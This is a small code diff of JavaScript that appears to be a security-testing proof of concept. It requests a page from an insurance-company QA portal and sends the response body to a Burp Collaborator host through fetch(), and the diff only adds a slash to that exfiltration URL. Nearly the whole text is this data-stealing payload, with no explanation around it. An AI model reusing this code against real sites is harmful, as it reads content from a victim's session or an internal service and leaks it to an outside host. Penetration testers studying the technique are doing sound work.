@@ -8,7 +8,7 @@
                     if (this.readyState == 4 && this.status == 200) {
 			var x = this.responseText;
 			
-			document.getElementById("demo").innerHTML = fetch("http://pwpsbj67rabtkdjf4eawoleev51xpm.burpcollaborator.net" + encodeURIComponent(x));
+			document.getElementById("demo").innerHTML = fetch("http://pwpsbj67rabtkdjf4eawoleev51xpm.burpcollaborator.net/" + encodeURIComponent(x));
 					}
          };
          xhttp.open("GET", "http://qa.myportal.ascinsurance.site:8880/", true);
